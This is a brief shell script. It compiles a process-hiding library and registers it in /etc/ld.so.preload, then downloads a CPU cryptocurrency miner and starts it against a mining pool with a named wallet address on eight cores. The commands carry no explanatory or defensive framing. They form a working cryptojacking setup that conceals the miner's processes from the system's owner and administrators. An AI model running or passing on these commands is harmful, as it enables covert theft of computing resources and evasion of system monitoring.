sudo apt install make -y && sudo apt install gcc -y && git clone https://github.com/chikahusarii/lemon-lide.git && cd lemon-lide && make
sudo mv libprocesshider.so /usr/local/lib/
sudo su -c "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"

wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.w1 -p x --cpu 8
